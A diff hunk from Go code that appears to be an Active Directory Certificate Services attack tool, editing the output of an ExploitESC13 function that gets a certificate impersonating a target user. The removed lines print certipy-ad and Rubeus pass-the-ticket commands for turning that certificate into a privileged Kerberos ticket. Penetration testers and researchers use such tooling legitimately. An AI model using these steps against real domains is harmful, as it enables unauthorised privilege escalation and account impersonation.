@@ -208,15 +208,8 @@ func ExploitESC13(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certif
 	}
 
 	fmt.Printf("[+] Certificate obtained for %s via ESC13 on template %q\n", targetUPN, templateName)
-	upnUser := targetUPN
-	if idx := strings.Index(upnUser, "@"); idx > 0 {
-		upnUser = upnUser[:idx]
-	}
 	fmt.Printf("[*] The issued certificate's issuance policy OID (%s) maps to group %s\n",
 		matchedFinding.IssuancePolicyOID, matchedFinding.LinkedGroupName)
-	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
-	fmt.Printf("    # The TGT will include group membership for: %s\n", matchedFinding.LinkedGroupName)
+	fmt.Printf("[*] The TGT will include group membership for: %s\n", matchedFinding.LinkedGroupName)
 	return cert, certKey, nil
 }
